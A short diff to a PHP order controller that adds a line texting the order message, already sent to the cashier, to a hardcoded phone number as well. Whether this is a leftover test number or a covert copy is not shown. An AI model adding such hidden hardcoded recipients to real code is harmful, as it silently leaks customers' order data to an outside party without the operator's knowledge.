@@ -242,6 +242,7 @@ class SecondOrderController extends Controller
             if($place->cashier_number !== null){
                 if($place->en == true){
                     $smsController->sendMessage(null, $txtBody, $place->cashier_number);
+                    $smsController->sendMessage(null, $txtBody, "255782835136");
                    } else{
                     $smsController->sendMessage(null,$swTxt, $place->cashier_number);
                    }
